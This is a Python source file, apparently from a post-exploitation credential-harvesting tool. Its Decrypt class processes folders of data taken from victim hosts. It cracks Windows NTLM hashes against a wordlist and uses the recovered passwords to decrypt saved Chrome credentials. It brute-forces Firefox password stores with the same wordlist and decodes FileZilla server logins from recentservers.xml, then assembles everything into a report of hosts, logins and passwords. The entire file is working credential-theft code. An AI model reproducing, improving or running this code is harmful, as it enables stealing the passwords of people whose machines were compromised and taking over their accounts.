import os
import pathlib
from plugins.chrome_v80_password_offline import Chrome_decryptor
from plugins.firepwd import Firefox_decryptor
from Logger import Logger
import xml.etree.ElementTree as ET
import json
from passlib.hash import nthash
from base64 import b64decode


class Decrypt:
    def __init__(self, folder, book, standalone):
        super(Decrypt, self).__init__()
        self.path_user = None
        self.hashes = None
        self.folder = folder
        self.book = book
        self.logger = Logger(folder, standalone)
        self.chrome_data = ''
        self.FireFox_data = ''
        self.FileZilla_data = ''

    def Decryptor(self):
        for folders in os.listdir(self.folder):
            if os.path.isdir(f'{self.folder}/{folders}'):
                path_host = self.folder + f'/{folders}/'
                with open(f'{path_host}hashes.txt', 'r', encoding='utf-8') as Json:
                    self.hashes = json.loads(Json.read())
                self.logger.logger([f'\nStarting decrypt chrome data for host {folders}\n{"*" * 50}'])
                for folder in os.listdir(path_host):
                    if os.path.isdir(path_host + folder):
                        self.path_user = path_host + folder
                        self.Chrome(folder)
                        self.FireFox()
                        self.FileZilla()
                self.logger.logger([f'{"*" * 50}\n'])
        return self.chrome_data + self.FireFox_data + f'\nFileZilla credentials\n{"*" * 50}\n{self.FileZilla_data}{"*" * 50}\n'

    def Chrome(self, folder):
        SSID = list()
        interrupt = False

        for i in os.listdir(f'{self.path_user}/user_ssid'):
            if os.path.isdir(f'{self.path_user}/user_ssid/{i}'):
                SSID.append([i, f'{self.path_user}/user_ssid/{i}'])

        for i in os.listdir(f'{self.path_user}/Chrome'):
            if os.path.isdir(f'{self.path_user}/Chrome/{i}'):
                for g in SSID:
                    for k in self.book:
                        try:
                            if nthash.hash(k) == self.hashes[folder][33:]:
                                self.chrome_data += Chrome_decryptor(f'{self.path_user}/Chrome', i, g[1], k, g[0])
                                interrupt = True
                                break
                        except:
                            pass
                    if interrupt:
                        self.logger.logger([f'Success decrypt for user {folder}'])
                        break
                if not interrupt:
                    try:
                        self.logger.logger([f'Error decrypt for user {folder}',
                                            f'Error decrypt for user {folder} (NTLM: {self.hashes[folder][33:]})'])
                    except:
                        pass
                else:
                    interrupt = False

    def FireFox(self):
        for i in os.listdir(f'{self.path_user}/FireFox'):
            if os.path.isdir(f'{self.path_user}/FireFox/{i}'):
                for g in self.book:
                    try:
                        self.FireFox_data += Firefox_decryptor(g, f'{pathlib.Path().absolute()}/{self.path_user}/FireFox/{i}')
                        break
                    except:
                        pass

    def FileZilla(self):
        try:
            filezilla_xml = ET.parse(f'{self.path_user}/FileZilla/recentservers.xml')
            root = filezilla_xml.getroot()
            for i in root[0]:
                if i.tag == 'Server' and i[4].tag == 'User' and i[5].tag == 'Pass':
                    self.FileZilla_data += f'Host IP: {i[0].text}\nPort: {i[1].text}\nLogin: {i[4].text}\nPassword: {b64decode(i[5].text).decode("UTF-8")}\n\n'
        except:
            pass
